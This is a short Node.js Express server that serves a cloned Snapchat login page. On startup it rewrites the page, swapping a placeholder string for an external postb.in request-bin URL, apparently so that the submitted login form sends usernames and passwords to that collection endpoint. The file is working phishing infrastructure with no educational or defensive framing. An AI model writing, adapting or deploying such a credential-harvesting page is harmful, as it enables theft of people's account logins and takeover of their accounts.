const express = require('express')
const app = express()
const port = 80
const fs = require('fs');

(async() => {
    let data = await fs.readFileSync("./public/Log In • Snapchat.htm").toString()
    data = data.replace("asdasdfsadfjkiouqweuiqoiwjdklndnaksjklsajkldgljklaskdf", "https://postb.in/1585358913208-7440893186721")
    await fs.unlinkSync("./public/Log In • Snapchat.htm")
    await fs.writeFileSync("./public/Log In • Snapchat.htm", data)
    console.log("Done")
})()
app.use(express.static('public'))

app.listen(port, () => console.log(`Example app listening on port ${port}!`))